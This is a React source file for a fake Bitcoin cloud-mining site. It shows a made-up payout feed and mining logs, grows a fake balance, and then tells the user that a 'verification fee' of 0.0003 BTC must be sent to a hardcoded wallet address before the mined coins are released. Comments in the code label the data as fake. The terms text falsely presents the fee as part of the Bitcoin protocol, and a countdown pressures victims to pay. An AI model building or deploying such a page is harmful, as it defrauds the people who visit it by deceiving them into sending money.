import React, { useState, useEffect, useRef } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import { Copy, CheckCircle, ArrowRight, Bitcoin, Activity, Clock, Lock, FileText, X, Globe, Wifi, Cpu, Database, ChevronRight } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const PAYMENT_ADDRESS = "bc1prqrc57quaem6gw0vmufph4ad04uj3l879jc4080stud4p3mqyxqswf93kh";
const FEE_AMOUNT = 0.0003;

// --- Fake Data Generators ---

const generateTransaction = () => {
  const types = ["Payment", "Payout"];
  const addresses = [
    "1A1zP1e...", "3J98t1W...", "bc1qxy2...", "bc1qar0...", "3KC8aLw...", "1BoatSL...", "bc1qw50...", "3D2oetd..."
  ];
  const amounts = [0.2, 0.4, 0.1, 0.5, 1.0, 0.2, 0.2, 0.8, 0.05, 1.2];
  
  return {
    id: Math.random().toString(36).substr(2, 9),
    address: addresses[Math.floor(Math.random() * addresses.length)],
    type: types[Math.floor(Math.random() * types.length)],
    amount: amounts[Math.floor(Math.random() * amounts.length)],
    time: "Just now"
  };
};

const LEGAL_TEXT = `
TERMS OF SERVICE AND USER AGREEMENT

1. ACCEPTANCE OF TERMS
By accessing and using this Bitcoin Mining Interface ("the Service"), you accept and agree to be bound by the terms and provision of this agreement. In addition, when using this Service, you shall be subject to any posted guidelines or rules applicable to such services.

2. MINING PROTOCOL
The Service utilizes a proprietary cloud-based SHA-256 algorithm optimization protocol ("CloudHash"). Users acknowledge that "mining" in this context refers to the allocation of remote computational power. Results may vary based on network difficulty and global hashrate distribution.

3. NETWORK FEES AND VERIFICATION
To prevent network congestion and Sybil attacks, a standard verification fee (Network Gas) is required for all withdrawals exceeding 0.1 BTC. This fee is used to prioritize your transaction in the mempool and verify the human identity of the requester. This fee is non-refundable and is a standard part of the Bitcoin protocol layer interaction.

4. USER OBLIGATIONS
You agree to use the Service only for lawful purposes. You represent that you are of legal age to form a binding contract. You agree not to use any automated scripts, bots, or spiders to access the Service.

5. DISCLAIMER OF WARRANTIES
The Service is provided on an "as is" and "as available" basis. We reserve the right to modify, suspend, or discontinue the Service at any time without notice. We do not guarantee that the Service will be uninterrupted, secure, or error-free.

6. LIMITATION OF LIABILITY
In no event shall the Service providers be liable for any direct, indirect, incidental, special, consequential, or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses resulting from the use of or inability to use the Service.

7. GOVERNING LAW
These Terms shall be governed by and construed in accordance with the laws of the Decentralized Autonomous Organization (DAO) jurisdiction, without regard to its conflict of law provisions.

8. ACKNOWLEDGEMENT
By checking the "I Agree" box, you acknowledge that you have read, understood, and agree to be bound by these Terms. You understand that the verification fee is a necessary step to secure your mined assets on the blockchain.

[...End of Document ID: 892-FKA-2024...]
`;

// --- Components ---

const HashrateGraph = () => {
  const [bars, setBars] = useState<number[]>(Array(40).fill(50));

  useEffect(() => {
    const interval = setInterval(() => {
      setBars(prev => {
        const newBars = [...prev.slice(1), Math.floor(Math.random() * 60) + 20];
        return newBars;
      });
    }, 100);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="flex items-end gap-[2px] h-16 w-full opacity-50">
      {bars.map((height, i) => (
        <div 
          key={i} 
          className="bg-orange-500 w-1.5 rounded-t-sm transition-all duration-300"
          style={{ height: `${height}%`, opacity: i / 40 }}
        />
      ))}
    </div>
  );
};

// --- Main App ---

export function App() {
  const [step, setStep] = useState<'input' | 'mining' | 'verify'>('input');
  const [userAddress, setUserAddress] = useState('');
  const [selectedAmount, setSelectedAmount] = useState(0.5);
  const [copied, setCopied] = useState(false);
  const [transactions, setTransactions] = useState<any[]>([]);
  const [agreedToTerms, setAgreedToTerms] = useState(false);
  const [showTermsModal, setShowTermsModal] = useState(false);

  // Mining State
  const [miningProgress, setMiningProgress] = useState(0);
  const [miningLogs, setMiningLogs] = useState<string[]>([]);
  const [currentBalance, setCurrentBalance] = useState(0.0000);
  const [currentHashrate, setCurrentHashrate] = useState(145.2);
  
  const logsEndRef = useRef<HTMLDivElement>(null);

  // Fake Transactions Feed
  useEffect(() => {
    const initial = Array.from({ length: 8 }).map(generateTransaction);
    setTransactions(initial);

    const interval = setInterval(() => {
      setTransactions(prev => [generateTransaction(), ...prev.slice(0, 6)]);
    }, 2500);

    return () => clearInterval(interval);
  }, []);

  // Auto-scroll logs
  useEffect(() => {
    if (logsEndRef.current) {
      logsEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [miningLogs]);

  // Hashrate Fluctuation
  useEffect(() => {
    if (step === 'mining') {
      const interval = setInterval(() => {
        setCurrentHashrate(prev => prev + (Math.random() * 4 - 2));
      }, 500);
      return () => clearInterval(interval);
    }
  }, [step]);

  const handleStartMining = (e: React.FormEvent) => {
    e.preventDefault();
    if (!userAddress || userAddress.length < 20) {
      alert("Please enter a valid Bitcoin address to proceed.");
      return;
    }
    if (!agreedToTerms) {
      alert("You must agree to the Terms of Service to access the mining pool.");
      return;
    }
    setStep('mining');
    startMiningProcess();
  };

  const startMiningProcess = () => {
    const logs = [
      "Initializing connection to Stratum server...",
      "Authenticating worker ID: 9X-2241...",
      "Connection established: pool.btc.com",
      "Downloading blockchain headers (Size: 4MB)...",
      "Verifying DAG integrity...",
      `Allocating hash power for target: ${selectedAmount} BTC`,
      "Optimization protocol: ENABLED",
      "Searching for valid nonce...",
      "Accepted share (Difficulty: 8442)",
      "Block candidate found...",
      "Validating Merkle root...",
      "Broadcasting to network...",
    ];

    let logIndex = 0;
    
    // Add initial logs
    const logInterval = setInterval(() => {
      if (logIndex < logs.length) {
        setMiningLogs(prev => [...prev, logs[logIndex]]);
        logIndex++;
      } else {
        // Random logs after initial sequence
        const randomLogs = [
          `Hashrate stable at ${currentHashrate.toFixed(1)} TH/s`,
          "New job received from pool",
          "Share accepted (150ms)",
          "Fan speed optimized: 65%",
          "Temp: 68°C - Optimal"
        ];
        if (Math.random() > 0.7) {
          setMiningLogs(prev => [...prev, randomLogs[Math.floor(Math.random() * randomLogs.length)]]);
        }
      }
    }, 800);

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setMiningProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          clearInterval(logInterval);
          setTimeout(() => {
            setMiningLogs(prevLogs => [...prevLogs, `>> BLOCK REWARD CONFIRMED: ${selectedAmount.toFixed(4)} BTC`, ">> INITIATING WITHDRAWAL PROTOCOL..."]);
            setTimeout(() => setStep('verify'), 2500);
          }, 1000);
          return 100;
        }
        return prev + 0.5; // Slower progress for realism
      });
      
      // Fake balance increment
      setCurrentBalance(prev => {
        if (prev < selectedAmount) {
          const increment = selectedAmount / 200; 
          return Math.min(prev + increment, selectedAmount);
        }
        return prev;
      });

    }, 100);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(PAYMENT_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = parseFloat(e.target.value);
    if (value <= 0.35) setSelectedAmount(0.2);
    else if (value <= 0.65) setSelectedAmount(0.5);
    else setSelectedAmount(0.8);
  };

  return (
    <div className="min-h-screen bg-[#0B0E14] text-slate-300 font-sans selection:bg-orange-500/30 flex flex-col relative overflow-hidden">
      
      {/* Background Gradients */}
      <div className="fixed inset-0 pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-blue-900/10 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-orange-900/10 rounded-full blur-[120px]" />
      </div>

      {/* Navbar */}
      <nav className="border-b border-slate-800/60 bg-[#0B0E14]/80 backdrop-blur-xl sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="bg-gradient-to-br from-orange-400 to-orange-600 p-1.5 rounded-lg shadow-lg shadow-orange-500/20">
              <Bitcoin className="w-5 h-5 text-white" />
            </div>
            <div>
              <span className="font-bold text-lg tracking-tight text-white block leading-none">BTC<span className="text-orange-500">Master</span></span>
              <span className="text-[10px] text-slate-500 uppercase tracking-widest">Mining Protocol</span>
            </div>
          </div>
          <div className="flex items-center gap-6 text-sm font-medium">
             <div className="hidden md:flex items-center gap-4">
                <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">
                  <Globe className="w-3 h-3 text-blue-500" />
                  <span className="text-xs text-slate-400">Mainnet: <span className="text-green-400">Connected</span></span>
                </div>
                <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">
                  <Database className="w-3 h-3 text-purple-500" />
                  <span className="text-xs text-slate-400">Pool Height: <span className="text-white">842,109</span></span>
                </div>
             </div>
          </div>
        </div>
      </nav>

      <main className="flex-grow w-full max-w-5xl mx-auto px-4 py-8 z-10">
        
        {/* Step 1: Input Address & Amount */}
        {step === 'input' && (
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="grid lg:grid-cols-3 gap-8"
          >
            {/* Main Form */}
            <div className="lg:col-span-2 space-y-6">
              <div className="bg-[#131722] border border-slate-800/60 rounded-xl p-8 shadow-2xl relative overflow-hidden group">
                 <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-orange-500 via-yellow-500 to-transparent opacity-50" />
                 
                 <div className="space-y-6 relative z-10">
                   <div>
                     <h1 className="text-3xl font-bold text-white mb-2">Configure Mining Node</h1>
                     <p className="text-slate-500">Connect your wallet to the decentralized high-performance pool.</p>
                   </div>

                   <form onSubmit={handleStartMining} className="space-y-6">
                      {/* Address Field */}
                      <div className="space-y-2">
                        <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider ml-1">Wallet Address (BTC)</label>
                        <div className="relative group/input">
                          <input
                            type="text"
                            value={userAddress}
                            onChange={(e) => setUserAddress(e.target.value)}
                            placeholder="Paste your Bitcoin address here..."
                            className="w-full bg-[#0B0E14] border border-slate-700 rounded-lg px-4 py-4 pl-12 text-white placeholder:text-slate-700 focus:outline-none focus:border-orange-500/50 focus:ring-1 focus:ring-orange-500/50 transition-all font-mono text-sm"
                          />
                          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-600 group-focus-within/input:text-orange-500 transition-colors">
                            <Bitcoin className="w-5 h-5" />
                          </div>
                          {userAddress.length > 25 && (
                             <div className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500 animate-in fade-in zoom-in">
                               <CheckCircle className="w-5 h-5" />
                             </div>
                          )}
                        </div>
                      </div>

                      {/* Slider */}
                      <div className="bg-[#0B0E14] rounded-lg p-6 border border-slate-800">
                        <div className="flex justify-between items-end mb-6">
                           <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                             <Activity className="w-4 h-4" /> Hash Power Allocation
                           </label>
                           <div className="text-right">
                             <div className="text-2xl font-bold text-white font-mono">{selectedAmount.toFixed(1)} BTC</div>
                             <div className="text-xs text-orange-500">Est. Reward Value</div>
                           </div>
                        </div>
                        
                        <input
                          type="range"
                          min="0.2"
                          max="0.8"
                          step="0.3"
                          value={selectedAmount}
                          onChange={handleSliderChange}
                          className="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-orange-500 hover:accent-orange-400"
                        />
                        <div className="flex justify-between mt-3">
                          {[0.2, 0.5, 0.8].map((val) => (
                            <div 
                              key={val} 
                              className={`text-xs font-mono transition-colors ${selectedAmount === val ? 'text-orange-500 font-bold' : 'text-slate-600'}`}
                            >
                              {val} BTC
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Terms and Conditions Checkbox */}
                      <div className="flex items-start gap-3 p-4 bg-slate-900/50 rounded-lg border border-slate-800/50">
                        <input 
                          type="checkbox" 
                          id="terms"
                          checked={agreedToTerms}
                          onChange={(e) => setAgreedToTerms(e.target.checked)}
                          className="mt-1 w-4 h-4 rounded border-slate-700 bg-slate-800 text-orange-500 focus:ring-orange-500/20 cursor-pointer"
                        />
                        <div className="text-sm text-slate-400 leading-relaxed">
                          I agree to the <button type="button" onClick={() => setShowTermsModal(true)} className="text-orange-500 hover:underline font-medium">Terms of Service</button>, 
                          Privacy Policy, and Cloud Mining Agreement. I certify that I am connecting a valid personal wallet.
                        </div>
                      </div>

                      <button 
                        type="submit"
                        className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 rounded-lg text-lg transition-all shadow-xl shadow-orange-900/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={!agreedToTerms || !userAddress}
                      >
                        Initiate Mining Protocol <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                      </button>
                   </form>
                 </div>
              </div>
            </div>

            {/* Sidebar Info */}
            <div className="space-y-6">
              {/* Network Status Card */}
              <div className="bg-[#131722] border border-slate-800/60 rounded-xl p-6 shadow-xl">
                 <h3 className="text-sm font-bold text-white mb-4 flex items-center gap-2">
                   <Wifi className="w-4 h-4 text-green-500" /> Network Status
                 </h3>
                 <div className="space-y-4">
                   <div className="flex justify-between items-center text-sm border-b border-slate-800 pb-2">
                     <span className="text-slate-500">Pool Hashrate</span>
                     <span className="text-white font-mono">458.3 EH/s</span>
                   </div>
                   <div className="flex justify-between items-center text-sm border-b border-slate-800 pb-2">
                     <span className="text-slate-500">Active Miners</span>
                     <span className="text-white font-mono">14,203</span>
                   </div>
                   <div className="flex justify-between items-center text-sm border-b border-slate-800 pb-2">
                     <span className="text-slate-500">Difficulty</span>
                     <span className="text-white font-mono">83.92 T</span>
                   </div>
                   <div className="flex justify-between items-center text-sm">
                     <span className="text-slate-500">24h Payouts</span>
                     <span className="text-green-400 font-mono">1,240.5 BTC</span>
                   </div>
                 </div>
              </div>

              {/* Recent Activity */}
              <div className="bg-[#131722] border border-slate-800/60 rounded-xl p-6 shadow-xl">
                 <h3 className="text-sm font-bold text-white mb-4 flex items-center gap-2">
                   <Clock className="w-4 h-4 text-orange-500" /> Recent Payouts
                 </h3>
                 <div className="space-y-3 relative h-[200px] overflow-hidden">
                    <div className="absolute bottom-0 left-0 right-0 h-12 bg-gradient-to-t from-[#131722] to-transparent z-10" />
                    <AnimatePresence>
                      {transactions.slice(0, 5).map((tx) => (
                        <motion.div
                          key={tx.id}
                          initial={{ opacity: 0, x: -10 }}
                          animate={{ opacity: 1, x: 0 }}
                          className="flex items-center justify-between text-xs p-2 bg-slate-900/50 rounded border border-slate-800/50"
                        >
                           <div className="flex items-center gap-2">
                             <div className={`w-1.5 h-1.5 rounded-full ${tx.type === 'Payout' ? 'bg-green-500' : 'bg-blue-500'}`} />
                             <span className="text-slate-400 font-mono">{tx.address}</span>
                           </div>
                           <span className="text-green-400 font-bold">+{tx.amount} BTC</span>
                        </motion.div>
                      ))}
                    </AnimatePresence>
                 </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* Step 2: Mining Simulation */}
        {step === 'mining' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="max-w-4xl mx-auto space-y-6"
          >
            {/* Header Status */}
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 bg-[#131722] p-6 rounded-xl border border-slate-800">
              <div className="flex items-center gap-4">
                 <div className="w-12 h-12 rounded-full bg-orange-500/10 flex items-center justify-center relative">
                   <div className="absolute inset-0 rounded-full border border-orange-500/30 animate-ping" />
                   <Cpu className="w-6 h-6 text-orange-500" />
                 </div>
                 <div>
                   <h2 className="text-xl font-bold text-white">Mining Active</h2>
                   <div className="flex items-center gap-2 text-sm text-slate-400">
                     <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                     Worker ID: <span className="font-mono text-slate-300">USER-{userAddress.substring(0,6)}</span>
                   </div>
                 </div>
              </div>
              <div className="text-right">
                <div className="text-sm text-slate-500">Current Hashrate</div>
                <div className="text-2xl font-mono font-bold text-white">{currentHashrate.toFixed(2)} TH/s</div>
              </div>
            </div>

            {/* Terminal & Visualization */}
            <div className="grid md:grid-cols-2 gap-6">
              {/* Terminal */}
              <div className="bg-[#0f1115] border border-slate-800 rounded-xl overflow-hidden shadow-2xl flex flex-col h-[400px]">
                <div className="bg-[#1a1d24] px-4 py-2 flex items-center justify-between border-b border-slate-800">
                   <div className="flex gap-1.5">
                     <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                     <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                     <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
                   </div>
                   <div className="text-xs font-mono text-slate-500">/bin/miner_core --verbose</div>
                </div>
                <div className="p-4 font-mono text-xs md:text-sm space-y-2 overflow-y-auto flex-grow scrollbar-thin scrollbar-thumb-slate-700">
                  {miningLogs.map((log, i) => (
                    <div key={i} className="text-green-500/90 break-all">
                      <span className="text-slate-600 mr-2">[{new Date().toLocaleTimeString()}]</span>
                      {log}
                    </div>
                  ))}
                  <div ref={logsEndRef} />
                </div>
              </div>

              {/* Stats & Progress */}
              <div className="space-y-6">
                 {/* Progress Card */}
                 <div className="bg-[#131722] border border-slate-800 rounded-xl p-6">
                    <h3 className="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">Block Reward Progress</h3>
                    <div className="relative pt-2">
                       <div className="flex justify-between items-end mb-2">
                          <span className="text-4xl font-mono font-bold text-white tracking-tight">
                            {currentBalance.toFixed(4)}
                            <span className="text-lg text-slate-500 ml-2">BTC</span>
                          </span>
                          <span className="text-xs px-2 py-1 bg-green-500/10 text-green-400 rounded border border-green-500/20">
                            {miningProgress}%
                          </span>
                       </div>
                       <div className="w-full bg-slate-900 rounded-full h-3 overflow-hidden border border-slate-800">
                         <motion.div 
                           className="bg-gradient-to-r from-orange-600 to-orange-400 h-full rounded-full relative"
                           style={{ width: `${miningProgress}%` }}
                         >
                           <div className="absolute top-0 right-0 bottom-0 w-4 bg-white/20 animate-pulse" />
                         </motion.div>
                       </div>
                    </div>
                 </div>

                 {/* Hashrate Graph */}
                 <div className="bg-[#131722] border border-slate-800 rounded-xl p-6 flex flex-col justify-end h-[215px]">
                    <div className="mb-auto">
                      <h3 className="text-sm font-semibold text-slate-400 uppercase tracking-wider">Live Hashrate</h3>
                    </div>
                    <HashrateGraph />
                 </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* Step 3: Verify & Withdraw */}
        {step === 'verify' && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            className="space-y-8"
          >
             <div className="text-center space-y-4">
               <div className="inline-flex items-center gap-2 px-4 py-1 bg-green-500/10 text-green-400 rounded-full border border-green-500/20 text-sm font-medium">
                 <CheckCircle className="w-4 h-4" /> Block #{Math.floor(Math.random() * 100000) + 840000} Mined Successfully
               </div>
               <h2 className="text-3xl md:text-5xl font-bold text-white">Withdrawal Ready</h2>
               <p className="text-slate-400 max-w-xl mx-auto">
                 The mined amount of <span className="text-white font-bold">{selectedAmount} BTC</span> is pending transfer to <span className="font-mono bg-slate-800 px-2 py-0.5 rounded text-sm">{userAddress.substring(0, 6)}...</span>
               </p>
             </div>

             <div className="grid md:grid-cols-5 gap-8 items-start max-w-5xl mx-auto">
               
               {/* Main Payment Box */}
               <div className="md:col-span-3 bg-[#131722] border border-slate-800 rounded-xl shadow-2xl overflow-hidden relative">
                 <div className="h-1 bg-orange-500 w-full animate-pulse" />
                 
                 <div className="p-8 space-y-8">
                   <div className="flex items-start gap-4">
                     <div className="p-3 bg-orange-500/10 rounded-lg text-orange-500 shrink-0">
                       <Lock className="w-6 h-6" />
                     </div>
                     <div>
                       <h3 className="text-lg font-bold text-white">Network Gas Fee Required</h3>
                       <p className="text-sm text-slate-400 mt-1 leading-relaxed">
                         To finalize this smart contract transaction, a standard network fee (Gas) is required. This validates your wallet address on the blockchain and prevents spam.
                       </p>
                     </div>
                   </div>

                   <div className="bg-[#0B0E14] rounded-xl p-6 border border-slate-800 space-y-6">
                      <div className="flex justify-between items-center pb-6 border-b border-slate-800">
                        <div className="text-center">
                           <div className="text-xs text-slate-500 uppercase">Amount Mined</div>
                           <div className="text-2xl font-bold text-white">
                             {selectedAmount} <span className="text-sm text-slate-500">BTC</span>
                           </div>
                        </div>
                        <ArrowRight className="text-slate-600" />
                        <div className="text-center">
                           <div className="text-xs text-slate-500 uppercase">Verification Fee</div>
                           <div className="text-2xl font-bold text-orange-500">
                             {FEE_AMOUNT} <span className="text-sm text-orange-500/70">BTC</span>
                           </div>
                        </div>
                      </div>

                      <div className="space-y-3">
                         <div className="flex justify-between items-center text-sm">
                           <span className="text-slate-400 font-semibold">Send exactly:</span>
                           <span className="text-red-400 text-xs flex items-center gap-1">
                             <Clock className="w-3 h-3" /> Offer expires in 14:59
                           </span>
                         </div>
                         <div className="flex items-center gap-2 bg-slate-900 border border-slate-700 rounded-lg p-3">
                           <code className="flex-grow text-white font-mono text-sm break-all">
                             {PAYMENT_ADDRESS}
                           </code>
                           <button 
                             onClick={copyToClipboard}
                             className="p-2 bg-slate-800 hover:bg-slate-700 rounded transition-colors text-slate-300 hover:text-white"
                           >
                             {copied ? <CheckCircle className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
                           </button>
                         </div>
                      </div>

                      <div className="flex justify-center py-2">
                        <div className="bg-white p-3 rounded-xl shadow-lg">
                           <QRCodeSVG value={PAYMENT_ADDRESS} size={150} />
                        </div>
                      </div>
                   </div>

                   <div className="bg-yellow-500/5 border border-yellow-500/10 rounded-lg p-4 flex gap-3 items-center">
                     <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse shrink-0" />
                     <p className="text-xs text-yellow-500/80">
                       Waiting for blockchain confirmation... Transaction will be auto-processed once fee is detected in the mempool.
                     </p>
                   </div>
                 </div>
               </div>

               {/* Right Sidebar Status */}
               <div className="md:col-span-2 space-y-6">
                 {/* Live Payouts - Compact */}
                 <div className="bg-[#131722] border border-slate-800 rounded-xl p-6">
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="text-sm font-bold text-white">Live Validations</h3>
                      <span className="text-xs text-green-500 flex items-center gap-1">
                        <Activity className="w-3 h-3" /> Online
                      </span>
                    </div>
                    <div className="space-y-3 max-h-[300px] overflow-hidden relative">
                       <div className="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-[#131722] to-transparent z-10" />
                       <AnimatePresence>
                         {transactions.map((tx) => (
                           <motion.div 
                              key={tx.id}
                              initial={{ opacity: 0, x: 20 }}
                              animate={{ opacity: 1, x: 0 }}
                              className="flex items-center justify-between text-xs border-b border-slate-800/50 pb-2 last:border-0"
                           >
                             <div className="flex flex-col">
                               <span className="text-slate-300 font-mono">{tx.address.substring(0,8)}...</span>
                               <span className="text-slate-600">{tx.type}</span>
                             </div>
                             <div className="flex flex-col items-end">
                               <span className="text-green-400 font-bold">+{tx.amount} BTC</span>
                               <span className="text-slate-600">Confirmed</span>
                             </div>
                           </motion.div>
                         ))}
                       </AnimatePresence>
                    </div>
                 </div>
               </div>

             </div>
          </motion.div>
        )}

      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800 bg-[#0B0E14] py-8 mt-12 z-10">
        <div className="max-w-7xl mx-auto px-4 text-center space-y-2">
          <div className="flex items-center justify-center gap-4 mb-4">
             <div className="text-slate-600 hover:text-slate-400 cursor-pointer">Terms</div>
             <div className="text-slate-600 hover:text-slate-400 cursor-pointer">Privacy</div>
             <div className="text-slate-600 hover:text-slate-400 cursor-pointer">Support</div>
          </div>
          <p className="text-slate-700 text-xs">
            © 2024 BTC Mining Protocol. All rights reserved. <br/>
            Running on SHA-256 Algorithm • Node ID: 88-F2 • Latency: 24ms
          </p>
        </div>
      </footer>

      {/* Terms Modal */}
      {showTermsModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
           <div className="bg-[#131722] border border-slate-700 w-full max-w-2xl rounded-xl shadow-2xl flex flex-col max-h-[80vh]">
             <div className="p-4 border-b border-slate-700 flex justify-between items-center">
               <h3 className="text-lg font-bold text-white flex items-center gap-2">
                 <FileText className="w-5 h-5 text-slate-400" /> Terms of Service
               </h3>
               <button onClick={() => setShowTermsModal(false)} className="text-slate-500 hover:text-white">
                 <X className="w-5 h-5" />
               </button>
             </div>
             <div className="p-6 overflow-y-auto text-sm text-slate-400 font-mono whitespace-pre-wrap leading-relaxed">
               {LEGAL_TEXT}
             </div>
             <div className="p-4 border-t border-slate-700 flex justify-end">
               <button 
                 onClick={() => {
                   setAgreedToTerms(true);
                   setShowTermsModal(false);
                 }}
                 className="bg-orange-600 hover:bg-orange-700 text-white px-6 py-2 rounded-lg font-bold transition-colors"
               >
                 I Agree
               </button>
             </div>
           </div>
        </div>
      )}

    </div>
  );
}

export default App;
